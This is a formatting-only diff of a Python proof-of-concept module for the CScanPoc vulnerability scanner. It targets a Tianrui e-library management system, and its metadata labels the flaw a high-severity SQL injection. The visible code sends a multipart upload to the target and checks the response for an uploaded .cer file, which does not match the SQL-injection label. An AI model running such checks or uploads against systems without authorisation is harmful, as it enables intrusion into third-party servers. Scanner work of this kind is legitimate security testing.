@@ -1,22 +1,23 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 hh = hackhttp.hackhttp()
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Tianrui_0003' # 平台漏洞编号，留空
-    name = '天睿电子图书管理系统系统 SQL注入' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    vuln_id = 'Tianrui_0003'  # 平台漏洞编号，留空
+    name = '天睿电子图书管理系统系统 SQL注入'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-09-22'  # 漏洞公布时间
     desc = '''
         天睿电子图书管理系统系统 /upfile_tu2.asp?id=1 SQL注入漏洞。
-    ''' # 漏洞描述
-    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0121549
-    cnvd_id = 'Unknown' # cnvd漏洞编号
-    cve_id = 'Unknown' #cve编号
+    '''  # 漏洞描述
+    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0121549
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
     product = '天睿电子图书管理系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
@@ -24,7 +25,7 @@ class Vuln(ABVuln):
 class Poc(ABPoc):
     poc_id = '133e54b4-e104-494d-91f4-7c1e46cc72b3'
     author = '国光'  # POC编写者
-    create_date = '2018-05-25' # POC创建时间
+    create_date = '2018-05-25'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -60,7 +61,8 @@ class Poc(ABPoc):
                 ------WebKitFormBoundaryriebpEo5zuOo08zY--\r
                 '''
             #proxy = ('127.0.0.1', 8887)
-            code, head, res, err, _ = hh.http(url, post=data, header=content_type)
+            code, head, res, err, _ = hh.http(
+                url, post=data, header=content_type)
             if code != 200:
                 return False
             m = re.search(r'=>\s*(upimg/[\d-]*\.cer)\s*', res)
